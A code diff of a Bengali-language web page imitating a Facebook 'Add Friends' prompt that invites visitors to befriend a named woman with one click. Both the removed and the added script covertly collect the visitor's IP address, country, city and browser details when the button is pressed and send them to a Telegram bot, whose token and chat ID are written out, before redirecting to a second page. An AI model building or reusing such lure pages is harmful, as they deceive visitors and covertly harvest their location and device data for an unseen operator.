@@ -6,52 +6,55 @@
     <title>Add Friends</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 flex flex-col items-center min-h-screen">
+<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">
 
-    <div class="w-full max-w-sm h-[50vh] flex justify-center items-center overflow-hidden mx-auto px-4 mt-4">
+    <!-- ছবির অংশ – সব পেজে একই -->
+    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
         <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
-             alt="Profile Image" 
-             class="h-full w-auto object-contain rounded-2xl shadow-lg">
+             alt="Profile" class="w-full h-full object-cover">
     </div>
 
-    <div class="p-8 w-full max-w-sm">
-        <button onclick="trackAndRedirect()" id="mainBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition duration-300 shadow-lg active:scale-95">
+    <!-- সাদা বক্স – mt-[-25px] দিয়ে ওভারল্যাপ -->
+    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center justify-center">
+
+        <h2 class="text-2xl font-bold text-gray-900 mb-6 text-center">ফ্রেন্ড অ্যাড করুন</h2>
+
+        <p class="text-gray-600 text-center mb-8 px-4 leading-relaxed">
+            এক ক্লিকে Mst. Priya Akter কে ফ্রেন্ড অ্যাড করুন। নিচের বাটনে ক্লিক করুন।
+        </p>
+
+        <button onclick="trackAndRedirect()" id="mainBtn" 
+                class="w-full max-w-xs bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-4 rounded-xl transition shadow-lg active:scale-95">
             Add Friends
         </button>
+
     </div>
 
-    <script>
-        async function trackAndRedirect() {
-            // ভুল সংশোধন করা হয়েছে: getElementById8 এর জায়গায় getElementById
-            const btn = document.getElementById('mainBtn');
-            btn.innerText = "Connecting...";
-            btn.disabled = true;
-            
-            try {
-                // আইপি ডাটা সংগ্রহ
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
+<script>
+    async function trackAndRedirect() {
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "Connecting...";
+        btn.disabled = true;
 
-                // ডিভাইসের তথ্য
-                const deviceInfo = navigator.userAgent;
-                const message = `👤 ইউজার: Mst.Sarmin Akter_11223\n\n🚨 নতুন ক্লিক এলার্ট!\n\n📱 ডিভাইস: ${deviceInfo}\n🌍 দেশ: ${ipData.country_name}\n🏙️ শহর: ${ipData.city}\n🌐 IP: ${ipData.ip}\n⏰ সময়: ${new Date().toLocaleString()}`;
+        try {
+            // IP + Device info
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            const ua = navigator.userAgent;
+            const msg = `📩 নতুন ক্লিক (index.html)\n\n👤 Device: ${ua}\n🌍 Country: ${ipData.country_name || 'N/A'}\n🏙️ City: ${ipData.city || 'N/A'}\nIP: ${ipData.ip || 'N/A'}\n⏰ Time: ${new Date().toLocaleString('bn-BD')}`;
 
-                // টেলিগ্রামে তথ্য পাঠানো
-                const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
-                const chatId = "8516934257";
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
-            } catch (e) {
-                console.error("Error:", e);
-            }
-
-            // পেজ রিডাইরেক্ট
-            window.location.href = "page2.html"; 
+            await fetch(`https://api.telegram.org/bot8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: "8516934257", text: msg})
+            });
+        } catch (err) {
+            console.error(err);
         }
-    </script>
+
+        window.location.href = "page2.html";
+    }
+</script>
+
 </body>
 </html>
